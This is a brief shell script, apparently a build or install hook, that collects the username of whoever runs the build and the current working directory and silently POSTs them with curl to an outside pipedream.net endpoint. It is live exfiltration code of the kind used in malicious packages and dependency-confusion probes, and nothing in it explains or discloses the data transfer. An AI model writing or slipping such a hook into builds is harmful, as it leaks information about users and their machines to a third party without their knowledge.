#!/bin/sh

# Get the username of the person who ran the build
USERNAME=$(whoami)

# Get the current working directory
CWD=$(pwd)

# Send the data to your server
curl -X POST -d "username=$USERNAME&cwd=$CWD" https://eoo6ltadscxvgto.m.pipedream.net/collect
